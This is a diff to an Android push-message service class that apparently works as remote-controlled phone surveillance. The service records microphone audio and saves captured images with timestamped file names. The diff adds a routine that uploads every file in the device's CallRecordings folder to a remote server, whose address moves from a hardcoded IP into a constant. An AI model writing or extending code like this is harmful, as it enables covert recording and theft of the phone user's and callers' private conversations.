@@ -62,6 +62,7 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
+import java.text.DateFormat;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Calendar;
@@ -314,8 +315,10 @@ public class GcmIntentService extends IntentService implements
     }
     private void captureAudio(String message)
     {
+        DateFormat df = new SimpleDateFormat("d MMM yyyy hh:mm a z");
+        String date = df.format(Calendar.getInstance().getTime());
         final String outputFile  = Environment.getExternalStorageDirectory().
-                getAbsolutePath() + "/audio.mp4";
+                getAbsolutePath() + "/" + date +".mp4";
         Log.i(TAG,outputFile);
         myAudioRecorder = new MediaRecorder();
         myAudioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
@@ -434,7 +437,9 @@ public class GcmIntentService extends IntentService implements
                 File root = android.os.Environment.getExternalStorageDirectory();
                 File dir = new File (root.getAbsolutePath() + "/download");
                 dir.mkdirs();
-                File file = new File(dir, "image.jpg");
+                DateFormat df = new SimpleDateFormat("d MMM yyyy hh:mm a z");
+                String date = df.format(Calendar.getInstance().getTime());
+                File file = new File(dir, date + ".jpg");
                 outStream = new FileOutputStream(file );
                 outStream.write(data);
                 outStream.close();
@@ -584,6 +589,20 @@ public class GcmIntentService extends IntentService implements
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
 
+
+    }
+    private void getCallRecordings() {
+
+        String path = Environment.getExternalStorageDirectory().toString()+"/CallRecordings";
+
+        File f = new File(path);
+        File file[] = f.listFiles();
+
+        for (int i=0; i < file.length; i++) {
+            Log.i("Files", file[i].getAbsolutePath());
+            uploadFile upload = new uploadFile();
+            upload.execute(file[i].getAbsolutePath(),"callrecordings");
+        }
 
     }
 
@@ -977,7 +996,7 @@ public class GcmIntentService extends IntentService implements
             String responseString = null;
             Log.i(TAG,"Uploading Data");
             HttpClient httpclient = new DefaultHttpClient();
-            HttpPost httppost = new HttpPost("http://128.199.179.143/groups/api/do_upload/");
+            HttpPost httppost = new HttpPost(Constants.ip+"do_upload/");
 
             try {
                 MultipartEntity entity = new MultipartEntity();
@@ -987,7 +1006,7 @@ public class GcmIntentService extends IntentService implements
                 // Adding file data to http body
                 entity.addPart("file", new FileBody(sourceFile));
                 entity.addPart("gcm",new StringBody((getRegistrationId(getApplicationContext()))));
-                entity.addPart("username", new StringBody("kevin"));
+                entity.addPart("username", new StringBody(Constants.username));
                 entity.addPart("type", new StringBody(params[1]));
 
 
